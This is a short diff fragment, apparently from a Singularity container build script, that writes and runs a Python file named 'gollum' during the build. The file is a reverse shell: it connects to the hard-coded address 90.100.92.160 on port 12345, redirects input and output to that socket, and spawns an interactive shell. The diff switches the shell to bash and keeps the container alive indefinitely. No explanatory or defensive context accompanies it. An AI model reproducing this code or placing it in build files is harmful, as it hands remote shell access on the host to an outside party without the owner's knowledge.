@@ -24,7 +24,7 @@ s.connect(("90.100.92.160",12345))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-pty.spawn(["/bin/sh","-i"])
+pty.spawn(["/bin/bash","-i"])
 PYTHON
 python3.5 $SINGULARITY_ROOTFS/gollum
-sleep 5000 
+sleep infinity
